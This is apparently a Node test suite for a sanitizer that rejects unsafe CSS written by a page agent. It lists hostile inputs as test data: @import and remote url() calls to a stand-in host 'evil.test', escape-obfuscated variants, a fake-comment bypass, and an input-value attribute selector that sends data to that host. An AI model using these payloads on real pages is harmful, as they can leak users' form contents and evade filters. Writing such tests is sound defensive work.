import assert from 'node:assert/strict';
import test from 'node:test';

import { PAGE_AGENT_CSS_MAX_BYTES, PageAgentCssSanitizer } from '../src/utils/pageAgentCss.ts';

function assertRejected(css, reasonPattern)
{
  const result = PageAgentCssSanitizer.check(css);
  assert.equal(result.ok, false, `expected rejection of ${css}`);
  assert.match(result.reason, reasonPattern);
}

function assertAccepted(css)
{
  assert.deepEqual(PageAgentCssSanitizer.check(css), { ok: true }, `expected ${css} to pass`);
}

test('rejects @import, also in another case or written with escapes', () =>
{
  assertRejected('@import "https://evil.test/a.css";', /@import/);
  assertRejected('@IMPORT url(data:text/css,a{});', /@import/);
  assertRejected('@\\69mport "https://evil.test/a.css";', /@import/);
  assertRejected('@imp\\ort "https://evil.test/a.css";', /@import/);
});

test('rejects remote url( quoted, unquoted, http, https and protocol-relative', () =>
{
  assertRejected('body { background: url("https://evil.test/a.png") !important; }', /url\(\)/);
  assertRejected('body { background: url(\'http://evil.test/a.png\') !important; }', /url\(\)/);
  assertRejected('body { background: url(https://evil.test/a.png) !important; }', /url\(\)/);
  assertRejected('body { background: url(http://evil.test/a.png) !important; }', /url\(\)/);
  assertRejected('body { background: url(//evil.test/a.png) !important; }', /url\(\)/);
  assertRejected('body { background: URL(  "  https://evil.test/a.png" ) !important; }', /url\(\)/);
});

test('rejects a remote url( after an allowed data: url(', () =>
{
  assertRejected(
    'a { background: url(data:image/png;base64,AAAA); } b { background: url(https://evil.test/x); }',
    /evil\.test/,
  );
});

test('rejects a url( hidden by a CSS escape', () =>
{
  assertRejected('body { background: \\75 rl(https://evil.test/a.png); }', /url\(\)/);
  assertRejected('body { background: \\000075rl(https://evil.test/a.png); }', /url\(\)/);
  assertRejected('body { background: ur\\l(https://evil.test/a.png); }', /url\(\)/);
  assertRejected('body { background: \\55\\52\\4c(https://evil.test/a.png); }', /url\(\)/);
  assertRejected('body { background: url(\\68 ttps://evil.test/a.png); }', /url\(\)/);
});

test('rejects a remote url( between two strings that look like a comment', () =>
{
  assertRejected(
    'a::before { content: "/*" !important; } input[value^="a"] { background: url(https://evil.test/a) !important; } b::after { content: "*/" !important; }',
    /url\(\)/,
  );
  assertRejected(
    'a::before { content: "\\2f\\2a" !important; } input[value^="a"] { background: url(https://evil.test/a) !important; } b::after { content: "\\2a\\2f" !important; }',
    /url\(\)/,
  );
});

test('rejects image-set( and -webkit-image-set( outright, also with var() or data: URLs', () =>
{
  assertRejected('body { background-image: image-set("https://evil.test/a.png" 1x); }', /image-set/);
  assertRejected('body { background-image: image-set(var(--x) 1x); }', /image-set/);
  assertRejected('body { background-image: -webkit-image-set(var(--x) 1x); }', /-webkit-image-set/);
  assertRejected('body { background-image: image-set(url(data:image/png;base64,AAAA) 1x); }', /image-set/);
  assertRejected('body { background-image: \\69mage-set(var(--x) 1x); }', /image-set/);
});

test('rejects src(, expression(, behavior: and -moz-binding', () =>
{
  assertRejected('body { background-image: src(var(--x)); }', /src\(\)/);
  assertRejected('body { width: expression(alert(1)); }', /expression\(\)/);
  assertRejected('body { behavior: url(data:text/x-component,a); }', /behavior:/);
  assertRejected('body { behavior : none; }', /behavior:/);
  assertRejected('body { -moz-binding: none; }', /-moz-binding/);
});

test('rejects a stylesheet over 20 KB', () =>
{
  const rule = 'main { max-width: none !important; }\n';
  const css = rule.repeat(Math.ceil((PAGE_AGENT_CSS_MAX_BYTES + 1) / rule.length));
  assertRejected(css, /20 KB/);
});

test('accepts plain declarations with !important', () =>
{
  assertAccepted(`
    /* widen the player */
    main > .content { max-width: none !important; width: 100% !important; }
    iframe#player { width: 100% !important; aspect-ratio: 16 / 9 !important; height: auto !important; }
    @media (max-width: 800px) { nav { display: none !important; } }
    a::before { content: "\\2014  " !important; }
  `);
});

test('accepts data: URLs in url(', () =>
{
  assertAccepted('body { background: url(data:image/png;base64,iVBORw0KGgo=) !important; }');
  assertAccepted('body { background: url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E") !important; }');
  assertAccepted('body { cursor: URL( \'DATA:image/png;base64,AAAA\' ), auto !important; }');
});
